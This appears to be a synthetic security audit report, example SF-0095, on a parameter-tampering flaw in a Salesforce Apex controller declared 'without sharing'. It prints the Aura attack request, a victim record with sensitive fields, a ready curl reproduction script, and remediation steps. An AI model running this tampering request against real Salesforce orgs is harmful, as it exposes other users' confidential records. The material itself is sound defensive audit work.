# Security Analysis Report
**System:** InsightGraph Analytics API (Salesforce-Integrated)
**Domain:** Data Analytics / BI Platform
**Example ID:** SF-0095
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.4 | Privilege escalation via parameter tampering on `CaseController.getCaseDetails` — attacker reads any BI/analytics Case record by substituting `caseId` |

---

## Finding 1 — BAC: Privilege Escalation via Parameter Tampering on Case Object (Pattern 2.4)

### Summary
The Apex controller `CaseController` on InsightGraph Analytics API (`a12ddab3.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Case object. Per §5.0 Pattern 2.4, an attacker with a valid Salesforce session can tamper with the `caseId` parameter in the Aura framework request to escalate access and read any Case record, bypassing intended privilege boundaries.

**Context.txt consistency:** The Apex method in §4.0 is `getCaseDetails(String caseId, ...)` and the Aura descriptor in §6.0 is `c.CaseController.getCaseDetails`. These are consistent — no naming conflict.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.CaseController.getCaseDetails`
**Affected endpoint:** `POST https://a12ddab3.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://a12ddab3.lightning.force.com/aura
Authorization: Bearer 00DA12DDAB3!ARa12ddab3...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DA12DDAB3!ARa12ddab3...

message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN",
"params":{"caseId":"001DAB3","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Case Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001DAB3", "Name": "Victim Case Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-51-3974"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DA12DDAB3!ARa12ddab3..."
curl -s -X POST "https://a12ddab3.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN","params":{"caseId":"001DAB3","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-51-3974
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CaseController { ... }`
2. `WHERE Id = :caseId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
